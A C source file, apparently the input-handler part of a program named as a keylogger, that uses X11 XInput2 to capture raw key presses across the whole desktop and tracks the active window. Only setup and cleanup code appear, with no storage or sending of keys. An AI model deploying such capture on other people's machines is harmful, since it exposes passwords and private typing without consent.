#include <X11/XKBlib.h>
#include <X11/extensions/XInput2.h>
#include <X11/Xatom.h>

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "keylogger/input_handler.h"


static int check_x_extensions(Display *display, int *xi_opcode_out) {
    int xi_opcode, event, error;
    int major = 2, minor = 0;
    int xkb_event_base, xkb_error_base, xkb_major = XkbMajorVersion, xkb_minor = XkbMinorVersion;

    if (!XQueryExtension(display, "XInputExtension", &xi_opcode, &event, &error)) {
        fprintf(stderr, "XInput extension not available\n");
        return 1;
    }

    int queryResult = XIQueryVersion(display, &major, &minor);
    if (queryResult == BadRequest) {
        fprintf(stderr, "Need XI 2.0 support (got %d.%d)\n", major, minor);
        return 1;
    } else if (queryResult != Success) {
        fprintf(stderr, "XIQueryVersion failed!\n");
        return 1;
    }

    if (!XkbQueryExtension(display, NULL, &xkb_event_base, &xkb_error_base, &xkb_major, &xkb_minor)) {
        fprintf(stderr, "Xkb extension not available\n");
        return 1;
    }

    *xi_opcode_out = xi_opcode;
    return 0;
}

int InputHandler_init(InputHandler *handler) {
    handler->display = XOpenDisplay(NULL);
    if (handler->display == NULL) {
        fprintf(stderr, "Cannot open X display\n");
        return 1;
    }
    if (check_x_extensions(handler->display, &(handler->xi_opcode))) return 1;

    Window root = DefaultRootWindow(handler->display);
    {
        XIEventMask m;
        m.deviceid = XIAllMasterDevices;
        m.mask_len = XIMaskLen(XI_LASTEVENT);
        m.mask = calloc(m.mask_len, sizeof(char));
        XISetMask(m.mask, XI_RawKeyPress);
        XISelectEvents(handler->display, root, &m, 1);
        XSync(handler->display, 0);
        free(m.mask);
    }

    handler->net_active_window_atom = XInternAtom(handler->display, "_NET_ACTIVE_WINDOW", 0);
    if (handler->net_active_window_atom == None) {
        fprintf(stderr, "Failed to get _NET_ACTIVE_WINDOW atom\n");
        return 1;
    }

    XSelectInput(handler->display, root, PropertyChangeMask);

    return 0;
}

void InputHandler_cleanup(InputHandler *handler) {
    if (handler->display) XCloseDisplay(handler->display);
}